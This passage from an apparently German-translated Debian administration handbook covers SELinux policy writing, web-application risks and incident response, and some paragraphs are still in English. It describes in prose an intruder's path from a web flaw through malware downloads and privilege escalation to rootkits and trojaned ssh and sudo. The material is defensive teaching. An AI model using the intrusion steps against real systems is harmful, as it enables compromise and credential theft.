							Diese Schnittstellen legen den Typ <literal>myapp_t</literal> als Prozess-Domain fest, die von jeder mit <literal>myapp_exec_t</literal> gekennzeichneten ausführbaren Datei benutzt werden sollte. Dies fügt diesen Objekten stillschweigend auch ein <literal>exec_type</literal>-Attribut hinzu, das seinerseits anderen Modulen ermöglicht, Berechtigungen zur Ausführung dieser Programme zu gewähren: zum Beispiel erlaubt das <literal>userdomain</literal>-Modul Prozessen mit den Domains <literal>user_t</literal>, <literal>staff_t</literal> und <literal>sysadm_t</literal>, sie auszuführen. Die Domains anderer eingeschränkter Anwendungen sind nicht berechtigt, sie auszuführen, es sei denn, die Regeln gewähren ihnen ähnliche Berechtigungen (dies trifft zum Beispiel auf <command>dpkg</command> mit seiner <literal>dpkg_t</literal>-Domain zu).
						</para>

					</callout>
					 <callout arearefs="example.te.interface">
						<para>
							<literal>logging_log_file</literal> ist eine von den Referenzrichtlinien bereitgestellte Schnittstelle. Sie zeigt an, dass mit diesem Typ gekennzeichnete Dateien Protokolldateien sind, die die entsprechenden Regeln wahrnehmen können sollten (zum Beispiel dem Befehl <command>logrotate</command> Berechtigungen erteilen, sodass er sie handhaben kann).
						</para>

					</callout>
					 <callout arearefs="example.te.allow">
						<para>
							Die <literal>allow</literal>-Anweisung ist die grundlegende Anweisung zur Genehmigung eines Vorgangs. Der erste Parameter ist die Prozess-Domain, der es erlaubt ist, den Vorgang auszuführen. Der zweite legt das Objekt fest, das ein Prozess der zuvor genannten Domain handhaben darf. Dieser Parameter hat die Form „<replaceable>type</replaceable>:<replaceable>class</replaceable>“, wobei <replaceable>type</replaceable> sein SELinux-Typ ist und <replaceable>class</replaceable> die Art des Objekts beschreibt (Datei, Verzeichnis, Socket, FIFO usw.). Schließlich beschreibt der letzte Parameter die Berechtigungen (die erlaubten Vorgänge).
						</para>
						 <para>
							Permissions are defined as the set of allowed operations and follow this template: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. However, you can also use macros representing the most useful permissions. The <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> lists them.
						</para>
						 <para>
							Die folgende Website stellt eine recht vollständige Liste von Objektklassen und von Berechtigungen, die gewährt werden können, bereit. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" />
						</para>

					</callout>

				</calloutlist>
				 <para>
					Jetzt müssen Sie lediglich den kleinsten Regelsatz finden, der erforderlich ist, damit die Anwendung oder der Dienst, auf die er abzielt, ordnungsgemäß funktionieren. Um dies zu erreichen, sollten Sie sich gut damit auskennen, wie die Anwendung funktioniert, und welche Art von Daten sie verarbeitet oder erzeugt.
				</para>
				 <para>
					Jedoch ist auch eine auf Erfahrung beruhende Vorgehensweise möglich. Nachdem die relevanten Objekte richtig gekennzeichnet sind, können Sie die Anwendung im permissive-Modus benutzen: die Vorgänge, die verboten würden, werden protokolliert, werden aber weiterhin ausgeführt. Durch eine Analyse der Protokolle können Sie nun die Vorgänge identifizieren, die erlaubt werden sollen. Hier ist ein Beispiel eines derartigen Protokolleintrags:
				</para>
				 
<programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1
</programlisting>
				 <para>
					Um diese Mitteilung besser verstehen zu können, gehen wir sie Schritt für Schritt durch.
				</para>
				 <table colsep="1">
					<title>Analyse eines SELinux-Ablaufs</title>
					 <tgroup cols="2">
						<thead>
							<row>
								<entry>Meldung</entry>
								 <entry>Beschreibung</entry>

							</row>

						</thead>
						 <tbody>
							<row>
								<entry><computeroutput>avc: denied</computeroutput></entry>
								 <entry>Ein Vorgang wurde abgelehnt.</entry>

							</row>
							 <row>
								<entry><computeroutput>{ read write }</computeroutput></entry>
								 <entry>Dieser Vorgang erforderte die Berechtigungen <literal>read</literal> und <literal>write</literal>.</entry>

							</row>
							 <row>
								<entry><computeroutput>pid=1876</computeroutput></entry>
								 <entry>Der Prozess mit der PID 1876 hat den Vorgang ausgeführt (oder hat versucht, ihn auszuführen).</entry>

							</row>
							 <row>
								<entry><computeroutput>comm="syslogd"</computeroutput></entry>
								 <entry>Der Prozess war eine Ausführung des Programms <literal>syslogd</literal>.</entry>

							</row>
							 <row>
								<entry><computeroutput>name="xconsole"</computeroutput></entry>
								 <entry>The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead.</entry>

							</row>
							 <row>
								<entry><computeroutput>dev=tmpfs</computeroutput></entry>
								 <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “sda3”).</entry>

							</row>
							 <row>
								<entry><computeroutput>ino=5510</computeroutput></entry>
								 <entry>Das Objekt ist mit der Inode-Nummer 5510 bezeichnet.</entry>

							</row>
							 <row>
								<entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
								 <entry>Dies ist der Sicherheitskontext des Prozesses, der den Vorgang ausgeführt hat.</entry>

							</row>
							 <row>
								<entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
								 <entry>Dies ist der Sicherheitskontext des Zielobjekts.</entry>

							</row>
							 <row>
								<entry><computeroutput>tclass=fifo_file</computeroutput></entry>
								 <entry>Das Zielobjekt ist eine FIFO-Datei.</entry>

							</row>

						</tbody>

					</tgroup>

				</table>
				 <para>
					Durch Betrachtung dieses Protokolleintrags ist es möglich, eine Regel zu erstellen, die diesen Vorgang erlauben würde. Zum Beispiel: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Dieser Prozess kann automatisiert werden, und genau dies bietet der Befehl <command>audit2allow</command> (aus dem Paket <emphasis role="pkg">policycoreutils</emphasis>). Diese Herangehensweise ist nur sinnvoll, wenn die verschiedenen Objekte bereits in Übereinstimmung mit den erforderlichen Einschränkungen richtig gekennzeichnet sind. In jedem Fall müssen Sie die erzeugten Regeln sorgfältig überprüfen und sie auf der Grundlage ihrer Kenntnis der Anwendung bewerten. Faktisch tendiert diese Herangehensweise dazu, mehr Berechtigungen zu erteilen als tatsächlich erforderlich sind. Die richtige Lösung besteht häufig darin, neue Typen zu erstellen und dann nur diesen Typen Berechtigungen zu gewähren. Es kommt auch vor, dass ein verweigerter Vorgang für die Anwendung keine Folgen hat. In diesem Fall kann es besser sein, einfach eine „<literal>dontaudit</literal>“-Regel hinzuzufügen, um einen Protokolleintrag zu vermeiden, obwohl eine Verweigerung stattgefunden hat.
				</para>
				 <sidebar> <title><emphasis>ERGÄNZUNGEN</emphasis> Keine Rollen in den Richtlinien</title>
				 <indexterm>
					<primary>Type Enforcement</primary>
				</indexterm>
				 <indexterm>
					<primary>Enforcement, Type Enforcement</primary>
				</indexterm>
				 <para>
					It might seem weird that roles do not appear at all when creating new rules. SELinux uses only the domains to find out which operations are allowed. The role intervenes only indirectly by allowing the user to switch to another domain. SELinux is based on a theory known as <emphasis>Type Enforcement</emphasis> and the type is the only element that matters when granting rights.
				</para>
				 </sidebar>
			</section>
			 <section>
				<title>Die Dateien kompilieren</title>
				 <para>
					Once the 3 files (<filename>example.if</filename>, <filename>example.fc</filename>, and <filename>example.te</filename>) match your expectations for the new rules, just run <command>make NAME=devel</command> to generate a module in the <filename>example.pp</filename> file (you can immediately load it with <command>semodule -i example.pp</command>). If several modules are defined, <command>make</command> will create all the corresponding <filename>.pp</filename> files.
				</para>

			</section>

		</section>

	</section>
	 <section id="sect.other-security-considerations">
		<title>Weitere sicherheitsbezogene Überlegungen</title>
		 <para>
			Security is not just a technical problem; more than anything, it is about good practices and understanding the risks. This section reviews some of the more common risks, as well as a few best practices which should, depending on the case, increase security or lessen the impact of a successful attack.
		</para>
		 <section>
			<title>Inhärente Risiken von Web-Anwendungen</title>
			 <para>
				Der universelle Charakter von Web-Anwendungen hat zu ihrer weiten Verbreitung geführt. Häufig laufen mehrere gleichzeitig: eine Web-Mail, ein Wiki, irgendein Gruppenarbeitssystem, Foren, eine Bildergalerie, ein Blog und so weiter. Viele dieser Anwendungen stützen sich auf den „LAMP“-Stack (<emphasis>Linux, Apache, MySQL, PHP</emphasis>). Leider wurden viele dieser Anwendungen auch ohne große Rücksicht auf Sicherheitsprobleme geschrieben. Von außen kommende Daten werden allzu häufig nach nur geringer ober gar keiner Überprüfung benutzt. Indem speziell hierfür ausgelegte Werte geliefert werden, kann der Aufruf eines Befehls unterlaufen werden, so dass stattdessen ein anderer ausgeführt wird. Viele dieser offensichtlichen Probleme sind im Laufe der Zeit behoben worden, jedoch treten regelmäßig neue Sicherheitsprobleme auf.
			</para>
			 <sidebar> <title><emphasis>WÖRTERVERZEICHNIS</emphasis> SQL-Einschleusung</title>
			 <para>
				Wenn ein Programm Daten auf unsichere Weise in SQL-Anfragen einfügt, wird es anfällig für SQL-Einschleusungen; dieser Begriff bezieht sich auf den Austausch eines Parameters in einer Weise, dass die tatsächlich vom Programm ausgeführte Anfrage sich von der beabsichtigten unterscheidet, entweder um die Datenbank zu beschädigen oder um auf Daten zuzugreifen, die normalerweise nicht zugänglich sein sollten. <ulink type="block" url="https://de.wikipedia.org/wiki/SQL-Injection" />
			</para>
			 <indexterm>
				<primary>SQL-Einschleusung</primary>
			</indexterm>
			 </sidebar> <para>
				Das regelmäßige Aktualisieren von Web-Anwendungen ist daher ein Muss, damit ein Cracker (ob ein professioneller Angreifer oder ein Skript-Kiddie) eine bekannte Sicherheitslücke nicht ausnutzen kann. Das tatsächliche Risiko hängt vom Einzelfall ab und reicht von der Datenvernichtung bis zur Ausführung beliebigen Codes, einschließlich der Verunstaltung von Websites.
			</para>

		</section>
		 <section>
			<title>Wissen, was zu erwarten ist</title>
			 <para>
				Eine Sicherheitslücke in einer Web-Anwendung wird häufig als Ausgangspunkt für einen Einbruchsversuch benutzt. Im Folgenden werden die möglichen Konsequenzen kurz dargestellt.
			</para>
			 <sidebar> <title><emphasis>KURZER BLICK</emphasis> HTTP-Anfragen filtern</title>
			 <para>
				Apache 2 enthält Module, die das Filtern ankommender HTTP-Anfragen ermöglichen. Hierdurch können einige Angriffsvektoren gestoppt werden. Zum Beispiel können Pufferüberläufe durch die Begrenzung der Parameterlänge verhindert werden. Allgemeiner ausgedrückt, kann man Parameter überprüfen, schon bevor sie an die Web-Anwendung weitergeleitet werden, und den Zugang aufgrund zahlreicher Kriterien einschränken. Dies kann sogar mit dynamischen Firewall-Aktualisierungen kombiniert werden, so dass ein Client, der eine der Regeln verletzt, für eine bestimmte Zeit vom Zugang zum Web-Server ausgeschlossen wird.
			</para>
			 <para>
				Das Einrichten dieser Überprüfungen kann eine lange und mühsame Aufgabe sein, sie kann sich aber auszahlen, wenn die Web-Anwendung, die eingesetzt werden soll, in Sicherheitsfragen eine zweifelhafte Erfolgsbilanz hat.
			</para>
			 <para>
				<emphasis>mod-security2</emphasis> (in the <emphasis role="pkg">libapache2-mod-security2</emphasis> package) is the main such module. It even comes with many ready-to-use rules of its own (in the <emphasis role="pkg">modsecurity-crs</emphasis> package) that you can easily enable.
			</para>
			 <indexterm>
				<primary><emphasis role="pkg">libapache-mod-security</emphasis></primary>
			</indexterm>
			 <indexterm>
				<primary><emphasis>mod-security</emphasis></primary>
			</indexterm>
			 </sidebar> <para>
				Die Folgen eines Einbruchs sind unterschiedlich deutlich in Abhängigkeit von den Motiven des Angreifers. <emphasis>Skript-Kiddies</emphasis> wenden lediglich Rezepte an, die sie auf Websites finden; meistens verunstalten sie eine Webseite oder löschen Daten. In subtileren Fällen fügen sie den Webseiten unsichtbare Inhalte hinzu, um so in Suchmaschinen die Verweise auf ihre eigenen Seiten zu verbessern.
			</para>
			 <para>
				A more advanced attacker will go beyond that. A disaster scenario could go on in the following fashion: the attacker gains the ability to execute commands as the <literal>www-data</literal> user, but executing a command requires many manipulations. To make their life easier, they install other web applications specially designed to remotely execute many kinds of commands, such as browsing the filesystem, examining permissions, uploading or downloading files, executing commands, and even provide a network shell. Often, the vulnerability will allow running a <command>wget</command> command that will download some malware into <filename>/tmp/</filename>, then executing it. The malware is often downloaded from a foreign website that was previously compromised, in order to cover tracks and make it harder to find out the actual origin of the attack.
			</para>
			 <para>
				An diesem Punkt verfügt der Angreifer über ausreichende Bewegungsfreiheit, um einen IRC-<emphasis>bot</emphasis> zu installieren (einen Roboter, der sich mit einem IRC-Server verbindet und über diesen Kanal gesteuert werden kann). Dieser Bot wird häufig dazu verwendet, illegale Dateien zu tauschen (nicht autorisierte Kopien von Filmen oder Software und so weiter). Ein entschlossener Angreifer könnte sogar noch weitergehen wollen. Das Konto <literal>www-data</literal> erlaubt keinen vollständigen Zugang zum Rechner, und der Angreifer wird versuchen, Administratorrechte zu erlangen. Nun sollte dies nicht möglich sein, aber wenn die Web-Anwendung nicht aktuell war, besteht das Risiko, dass der Kernel und weitere Programme ebenfalls veraltet sind; dies ergibt sich manchmal aus einer Entscheidung des Administrators, der, obwohl er die Sicherheitslücke kennt, es versäumt hat, das System zu aktualisieren, da es keine lokalen Benutzer gibt. Der Angreifer kann dann diese zweite Sicherheitslücke ausnutzen, um Root-Zugang zu erlangen.
			</para>
			 <sidebar> <title><emphasis>WÖRTERVERZEICHNIS</emphasis> Rechteausweitung</title>
			 <para>
				Dieser Begriff umfasst alles, was dazu verwendet werden kann, höhere Berechtigungen zu erlangen, als ein bestimmter Benutzer normalerweise haben sollte. Das <command>sudo</command>-Programm dient genau dem Zweck, einigen Benutzern administrative Rechte zu geben. Derselbe Begriff wird aber auch verwendet, um die Tat eines Angreifers zu beschreiben, der eine Sicherheitslücke ausnutzt, um unangemessene Rechte zu erlangen.
			</para>
			 </sidebar> <para>
				Jetzt ist der Angreifer im Besitz des Rechners; er wird gewöhnlich versuchen, diesen privilegierten Zugang möglichst lange zu erhalten. Hierzu ist die Installation eines <emphasis>Rootkits</emphasis> erforderlich, eines Programms, dass einige Komponenten des Systems ersetzt, so dass der Angreifer in der Lage ist, zu einem späteren Zeitpunkt erneut die Privilegien des Administrators zu erlangen; das Rootkit versucht außerdem, sein Vorhandensein zu verbergen, wie auch alle Spuren des Einbruchs. Ein unterwandertes <command>ps</command>-Programm wird dann einige Prozesse nicht auflisten, <command>netstat</command> wird einige der aktiven Verbindungen nicht aufführen und so weiter. Durch Verwendung der Root-Berechtigungen war der Angreifer in der Lage, das ganze System zu beobachten, hat aber keine wichtigen Daten gefunden; daher wird er versuchen, auf andere Rechner des Firmennetzwerks zuzugreifen. Durch die Analyse des Administratorkontos und der Verlaufsdateien findet der Angreifer heraus, auf welche Rechner üblicherweise zugegriffen wird. Indem der Angreifer <command>sudo</command> oder <command>ssh</command> durch ein verfälschtes Programm ersetzt, kann er einige Passwörter des Administrators abfangen, die er bei den entdeckten Servern anwenden wird... und der Einbruch kann sich von hier aus weiterverbreiten.
			</para>
			 <para>
				Dies ist ein Albtraumszenarium, das durch eine Reihe von Maßnahmen verhindert werden kann. Die nächsten Abschnitte beschreiben einige von ihnen.
			</para>

		</section>
		 <section id="sect.choosing-the-software-wisely">
			<title>Die Software wohlüberlegt auswählen</title>
			 <para>
				Sobald die möglichen Sicherheitsprobleme bekannt sind, muss ihnen bei jedem Schritt des Bereitstellungsprozesses eines Dienstes Rechnung getragen werden, insbesondere bei der Auswahl der zu installierenden Software. Viele Websites, wie zum Beispiel <literal>SecurityFocus.com</literal>, unterhalten eine Liste kürzlich entdeckter Sicherheitslücken, die ein Bild einer Sicherheitsbilanz vermitteln können, bevor eine bestimmte Software eingesetzt wird. Natürlich muss diese Information der Popularität der besagten Software gegenübergestellt werden: ein weiter verbreitetes Programm ist ein verlockenderes Ziel und wird folglich eingehender erforscht. Andererseits kann ein Nischenprogramm voller Sicherheitslücken sein, die aufgrund mangelnden Interesses an einem Sicherheitsaudit niemals veröffentlicht werden.
			</para>
			 <sidebar> <title><emphasis>WÖRTERVERZEICHNIS</emphasis> Sicherheitsaudit</title>
			 <para>
				Ein Sicherheitsaudit ist der Prozess, bei dem der Quellcode einer Software gründlich gelesen und analysiert wird, wobei nach möglichen Sicherheitslücken Ausschau gehalten wird, die er enthalten könnte. Derartige Audits sind gewöhnlich proaktiv und werden durchgeführt, um zu gewährleisten, dass ein Programm gewisse Sicherheitserfordernisse erfüllt.
			</para>
			 </sidebar> <para>
				In der Welt der freien Software besteht im allgemeinen große Wahlfreiheit, und eine Software einer anderen vorzuziehen, sollte eine Entscheidung sein, die auf örtlich gültigen Kriterien beruht. Eine höhere Anzahl von Leistungsmerkmalen bringt auch ein erhöhtes Risiko einer Sicherheitslücke mit sich, die im Code verborgen sein könnte; es kann auch kontraproduktiv sein, das höchst entwickelte Programm zu wählen, und ein besserer Ansatz besteht gewöhnlich darin, das einfachste Programm, das die Erfordernisse erfüllt, auszuwählen.
			</para>
			 <sidebar> <title><emphasis>WÖRTERVERZEICHNIS</emphasis> Zero-Day-Exploit</title>
			 <para>
				Eine <emphasis>Zero-Day</emphasis>-Attacke ist kaum zu verhindern; der Begriff beschreibt eine Sicherheitslücke, die den Autoren des Programms noch nicht bekannt ist.
			</para>
			 </sidebar>
		</section>
		 <section id="sect.managing-a-machine-as-a-whole">
			<title>Einen Rechner als Ganzes verwalten</title>
			 <para>
				Most Linux distributions install by default a number of Unix services and many tools. In many cases, these services and tools are not required for the actual purposes for which the administrator set up the machine. As a general guideline in security matters, unneeded software is best uninstalled. Indeed, there is no point in securing an FTP server, if a vulnerability in a different, unused service can be used to get administrator privileges on the whole machine.
			</para>
			 <para>
				Aus demselben Grund werden Firewalls häufig so konfiguriert, dass sie Zugang nur zu solchen Diensten ermöglichen, die öffentlich zugänglich sein sollen.
			</para>
			 <para>
				Current computers are powerful enough to allow hosting several services on the same physical machine. From an economic viewpoint, such a possibility is interesting: only one computer to administrate, lower energy consumption, and so on. From the security point of view, however, such a choice can be a problem. One compromised service can bring access to the whole machine, which in turn compromises the other services hosted on the same computer. This risk can be mitigated by isolating the services. This can be attained either with virtualization (each service being hosted in a dedicated virtual machine or container), or with AppArmor/SELinux (each service daemon having an adequately designed set of permissions).
			</para>

		</section>
		 <section id="sect.users-are-players">
			<title>Benutzer sind Spieler</title>
			 <para>
				Spricht man über Sicherheit, so denkt man sogleich an den Schutz vor Angriffen durch anonyme Cracker, die sich irgendwo im Internetdschungel verbergen; eine häufig vergessene Tatsache ist jedoch, dass Risiken auch von innen entstehen können: ein Angestellter, der im Begriff ist, die Firma zu verlassen, könnte sensible Dateien aus wichtigen Projekten herunterladen und an Wettbewerber verkaufen, ein nachlässiger Verkäufer könnte während eines Treffens mit einem potentiellen Neukunden seinen Schreibtisch verlassen, ohne seine Sitzung zu sperren, ein ungeschickter Benutzer könnte versehentlich das falsche Verzeichnis löschen und so weiter.
			</para>
			 <para>
				Die Reaktion auf diese Risiken kann technische Lösungen umfassen: nur die tatsächlich erforderlichen Berechtigungen sollten den Benutzern gewährt werden, und regelmäßige Sicherungskopien sind unabdingbar. In vielen Fällen wird der angemessene Schutz jedoch auch mit einer Unterweisung der Benutzer in der Vermeidung von Risiken verbunden sein.
			</para>
			 <sidebar> <title><emphasis>KURZER BLICK</emphasis> <emphasis role="pkg">autolog</emphasis></title>
			 <para>
				Das Paket <emphasis role="pkg">autolog</emphasis> stellt ein Programm bereit, das nach einer einstellbaren Zeitspanne untätige Benutzer selbstständig abschaltet. Es ermöglicht es auch, Benutzerprozesse abzustellen, die nach dem Ende einer Sitzung bestehen bleiben, um so Benutzer daran zu hindern, Daemons zu betreiben.
			</para>
			 </sidebar>
		</section>
		 <section id="sect.physical-security">
			<title>Physische Sicherheit</title>
			 <para>
				Es macht keinen Sinn, die Dienste und Netzwerke abzusichern, wenn die Rechner selbst nicht geschützt sind. Es gehört sich, dass wichtige Daten auf im laufenden Betrieb austauschbaren Platten in einem RAID-System gespeichert sind, da Festplatten irgendwann ausfallen und die Datenverfügbarkeit unabdingbar ist. Aber wenn jeder Pizzalieferant das Gebäude betreten, in den Serverraum schleichen und mit einigen ausgewählten Festplatten davonlaufen kann, ist ein wichtiger Teilbereich der Sicherheit nicht gegeben. Wer kann den Serverraum betreten? Wird der Zugang überwacht? Diese Fragen verdienen Beachtung (und eine Antwort), wenn die physische Sicherheit beurteilt wird.
			</para>
			 <para>
				Zur physischen Sicherheit gehört auch, dass Unfallrisiken wie Brände bedacht werden. Wegen dieses besonderen Risikos ist es gerechtfertigt, die Sicherungsmedien in einem separaten Gebäude zu lagern, oder wenigstens in einem feuersicheren Stahlschrank.
			</para>

		</section>
		 <section>
			<title>Rechtliche Haftung</title>
			 <para>
				Einem Administrator vertrauen seine Nutzer mehr oder weniger vorbehaltlos, genauso wie die Nutzer des Netzwerks im Allgemeinen. Er sollte deshalb jede Nachlässigkeit vermeiden, die von böswilligen Menschen ausgenutzt werden könnte.
			</para>
			 <para>
				Ein Angreifer, der die Kontrolle über Ihren Rechner übernimmt und ihn dann als vorgeschobene Basis („Relais-System“ genannt) benutzt, um von ihm weitere ruchlose Aktivitäten auszuführen, könnte Ihnen gesetzliche Unannehmlichkeiten verursachen, da die angegriffene Seite den Angriff zunächst als von Ihrem System ausgehend sieht, und daher Sie als Angreifer (oder als Komplizen) betrachten wird. In vielen Fällen wird der Angreifer Ihren Server als Relais zur Versendung von Spam benutzen, was keine großen Auswirkungen haben sollte (außer möglicherweise die Registrierung in schwarzen Listen, die Ihre Fähigkeit, legitime E-Mails zu versenden, beschränken könnte), aber dennoch unangenehm wäre. In anderen Fällen können durch Ihren Rechner bedeutendere Störungen verursacht werden, wie zum Beispiel Denial-of-Service-Angriffe. Dies wird manchmal zu Einnahmeverlusten führen, da die berechtigten Dienste nicht verfügbar sein und Daten zerstört werden können; manchmal wird dies auch tatsächliche Kosten verursachen, da die angegriffene Seite rechtliche Schritte gegen Sie einleiten kann. Rechteinhaber können Sie verklagen, wenn eine nicht autorisierte Kopie eines urheberrechtlich geschützten Werkes von Ihrem Server weitergegeben wird, wie auch andere Unternehmen, falls sie aufgrund von Dienstgütevereinbarungen zu Strafzahlungen infolge des Angriffs durch Ihren Rechner verpflichtet sind.
			</para>
			 <para>
				Wenn dies geschieht, genügt es nicht gewöhnlich nicht, seine Unschuld zu beteuern; Sie werden zumindest überzeugende Beweise benötigen, die von einer bestimmten IP-Adresse ausgehende verdächtige Aktivitäten auf Ihrem Rechner zeigen. Dies wird nicht möglich sein, wenn Sie die Empfehlungen dieses Kapitels vernachlässigen und zulassen, dass der Angreifer Zugang zu einem privilegierten Konto (insbesondere Root) erlangt und dies dann dazu benutzt, seine Spuren zu verwischen.
			</para>

		</section>

	</section>
	 <section id="sect.dealing-with-compromised-machine">
		<title>Umgang mit einem kompromittierten Rechner</title>
		 <para>
			Trotz bester Absichten und aller Sorgfalt bei der Erstellung der Sicherheitsregeln wird ein Administrator eines Tages einer feindlichen Übernahme gegenüberstehen. Dieser Abschnitt stellt einige Leitlinien darüber bereit, wie man im Falle dieser unglücklichen Umstände reagieren sollte.
		</para>
		 <section>
			<title>Den Einbruch eines Crackers entdecken und sehen</title>
			 <para>
				Der erste Schritt einer Reaktion auf einen Einbruch besteht darin, eine derartige Tat überhaupt wahrzunehmen. Dies ist nicht selbstverständlich, vor allem nicht ohne eine angemessene Überwachungsinfrastruktur.
			</para>
			 <para>
				Einbrüche bleiben häufig unentdeckt, bis sie direkte Folgen für die legitimen Dienste haben, die auf dem Rechner untergebracht sind, wie zum Beispiel, dass Verbindungen langsamer werden, dass einige Benutzer sich nicht anmelden können, oder eine andere Fehlfunktion. Angesichts dieser Probleme muss sich der Administrator den Rechner genau ansehen und sorgfältig alles überprüfen, was nicht normal funktioniert. Dann entdeckt er normalerweise einen ungewöhnlichen Prozess, zum Beispiel einen namens <literal>apache</literal> statt des standardmäßigen <literal>/usr/sbin/apache2</literal>. Wenn wir diesem Beispiel weiter folgen, so sollte seine Prozesskennung notiert und mit <filename>/proc/<replaceable>pid</replaceable>/exe</filename> überprüft werden, um zu sehen, welches Programm diesen Prozess zur Zeit gerade ausführt:
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
</screen>
			 <para>
				Ein unter <filename>/var/tmp/</filename> installiertes Programm, das als Webserver läuft? Kein Zweifel, der Rechner ist kompromittiert.
			</para>
			 <para>
				Dies ist nur ein Beispiel, aber auch zahlreiche andere Hinweise können den Administrator alarmieren:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						eine Option eines Befehls, die nicht mehr funktioniert; die Version des Programms, in der der Befehl angeblich vorliegt, stimmt nicht mit der Version überein, die laut <command>dpkg</command> installiert sein sollte;
					</para>

				</listitem>
				 <listitem>
					<para>
						eine Eingabeaufforderung oder ein Begrüßungsbildschirm, die anzeigen, dass die vorherige Verbindung von einem unbekannten Server oder einem anderen Kontinent kam;
					</para>

				</listitem>
				 <listitem>
					<para>
						Fehler, die darauf zurückzuführen sind, dass die Partition <filename>/tmp/</filename> voll ist, wobei sich dann herausstellt, dass sie voller illegaler Filmkopien ist;
					</para>

				</listitem>
				 <listitem>
					<para>
						und so weiter.
					</para>

				</listitem>

			</itemizedlist>

		</section>
		 <section>
			<title>Den Server vom Netz nehmen</title>
			 <para>
				Außer in sehr ungewöhnlichen Fällen erfolgt ein Einbruch über das Netzwerk, und der Angreifer benötigt ein funktionierendes Netzwerk, um seine Ziele zu erreichen (auf vertrauliche Daten zuzugreifen, illegale Dateien zu tauschen, seine Identität durch die Verwendung des Rechners als Zwischenstation zu verbergen und so weiter). Dadurch dass der Rechner vom Netz genommen wird, wird es dem Angreifer unmöglich gemacht, diese Ziele zu erreichen, falls ihm dies bisher noch nicht gelungen ist.
			</para>
			 <para>
				This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> and <xref linkend="sect.reconstituting-the-attack-scenario" />), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines.
			</para>

		</section>
		 <section id="sect.keeping-everything-that-could-be-used-as-evidence">
			<title>Alles aufbewahren, was als Beweis dienen könnte</title>
			 <para>
				Um den Angriff verstehen oder um rechtliche Schritte gegen die Angreifer einleiten zu können, ist es erforderlich, Kopien aller wichtigen Elemente zu erstellen; hierzu gehört der Inhalt der Festplatte, eine Liste aller laufenden Prozesse und eine Liste aller offenen Verbindungen. Der Inhalt des RAM könnte auch verwendet werden, er wird in der Praxis aber selten benutzt.
			</para>
			 <para>
				Im Eifer des Gefechts sind Administratoren häufig versucht, auf dem kompromittierten Rechner zahlreiche Überprüfungen durchzuführen; dies ist jedoch gewöhnlich keine gute Idee. Jeder Befehl kann unterwandert sein und daher Beweisstücke löschen. Die Überprüfungen sollten auf ein Mindestmaß beschränkt werden (<command>netstat -tupan</command> für Netzwerkverbindungen, <command>ps auxf</command> für eine Liste der Prozesse, <command>ls -alR /proc/[0-9]*</command> für einige zusätzliche Informationen über laufende Programme), und jede durchgeführte Überprüfung sollte sorgfältig notiert werden.
			</para>
			 <sidebar> <title><emphasis>VORSICHT</emphasis> Analyse unter Spannung</title>
			 <para>
				Obwohl es verlockend sein mag, das System zu analysieren, während es läuft, sollte dies unterlassen werden, vor allem, wenn der Server physisch nicht erreichbar ist: Sie können einfach den Programmen, die zur Zeit auf dem kompromittierten System installiert sind, nicht trauen. Es ist gut möglich, dass ein unterwanderter <command>ps</command>-Befehl einige Prozesse verbirgt, oder dass ein unterwanderter <command>ls</command>-Befehl Dateien verbirgt; manchmal ist sogar der Kernel kompromittiert!
			</para>
			 <para>
				Falls eine solche Analyse „unter Spannung“ dennoch notwendig ist, sollte darauf geachtet werden, nur bekanntermaßen einwandfreie Programme zu benutzen. Eine gute Möglichkeit dies zu tun besteht darin, eine Rettungs-CD mit einwandfreien Programmen zu verwenden oder eine schreibgeschützte Netzwerkfreigabe. Jedoch könnten selbst diese Gegenmaßnahmen nicht ausreichend sein, falls der Kernel selbst kompromittiert ist.
			</para>
			 </sidebar> <para>
				Sobald die „dynamischen“ Elemente gespeichert sind, wird im nächsten Schritt ein vollständiges Abbild der Festplatte gespeichert. Die Erstellung eines derartigen Abbildes ist nicht möglich, solange sich das Dateisystem noch verändert. Deshalb muss es schreibgeschützt neu eingehängt werden. Die einfachste Lösung besteht häufig darin, den Server brutal anzuhalten (nachdem der Befehl <command>sync</command> ausgeführt wurde) und dann den Rechner mit einer Rettungs-CD neu zu starten. Jede Partition sollte mit einem Hilfsprogramm wie <command>dd</command> kopiert werden; diese Abbilder können zu einem anderen Server geschickt werden (zum Beispiel mit dem sehr praktischen Hilfsprogramm <command>nc</command>). Eine andere Möglichkeit ist eventuell noch einfacher: nehmen Sie einfach die Festplatte aus dem Rechner und ersetzen Sie sie durch eine neue, die neu formatiert und installiert werden kann.
			</para>

		</section>
		 <section>
			<title>Neu installieren</title>
			 <indexterm>
				<primary>Hintertür</primary>
			</indexterm>
			 <para>
				The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we get rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates.
			</para>
			 <para>
